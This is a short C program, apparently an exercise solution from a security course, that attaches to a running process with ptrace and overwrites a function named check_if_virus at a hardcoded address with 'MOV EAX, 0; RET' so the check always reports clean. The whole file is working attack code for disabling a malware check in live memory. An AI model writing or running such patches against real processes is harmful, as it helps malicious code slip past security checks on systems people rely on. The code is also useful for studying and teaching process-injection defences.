#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

int pid = 0x12345678;

int main() {



	if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1) {  // Attach to the process
	  perror("attach");
	  return 1;
	}
	int status;
	waitpid(pid, &status, 0);  // Wait for the process to stop
	if (WIFEXITED(status)) { return 1; }  // Abort if the process exits
	// Do your magic here

	
	int address_check_if_virus = 0xb7fd3750;

	char* return_zero_function = "\xb8\x00\x00\x00\x00\xc3";		//'MOV EAX, 0; RET;'
	int code1 = 0x000000b8;
	int code2 = 0x9090c300;

	//replace the code in address_check_if_virus with the code of return_zero_function


	if (ptrace(PTRACE_POKETEXT, pid, address_check_if_virus, code1) == -1) {  // override check_if_virus
	  perror("poketext");
	  return 1;
	}

	if (ptrace(PTRACE_POKETEXT, pid, address_check_if_virus+4, code2) == -1) {  // override check_if_virus
	  perror("poketext");
	  return 1;
	} 


	if (ptrace(PTRACE_DETACH, pid, NULL, NULL) == -1) {  // Detach when done
	  perror("detach");
	  return 1;
	}



    return 0;
}
